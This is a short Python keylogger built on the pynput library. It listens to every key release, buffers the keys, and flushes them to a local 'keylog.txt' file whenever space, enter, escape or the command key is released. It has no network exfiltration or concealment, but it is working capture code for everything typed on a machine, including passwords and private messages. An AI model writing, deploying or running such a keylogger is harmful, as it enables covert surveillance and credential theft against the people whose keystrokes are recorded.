import pynput 
import os 

keyboard = pynput.keyboard
script_dir = os.path.dirname(os.path.abspath(__file__))

key_buffer = []

# Configuration
key_logs_file_path = os.path.join(script_dir, "keylog.txt")


def combined_keys_in_list(list: list):
    return "".join(list)

def save_in_key_log_file(combined_letter_in_list):
    with open(key_logs_file_path, "a") as file:
        file.write(combined_letter_in_list)

def on_press(key):
    pass

def on_release(key):
    key_str = str(key) 
    
    key_buffer.append(key_str)
    
    buttkey = keyboard.Key
    if key in (buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
        result = combined_keys_in_list(key_buffer)
        save_in_key_log_file(result)
        key_buffer.clear()


    

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release
)

listener.start()
input("")
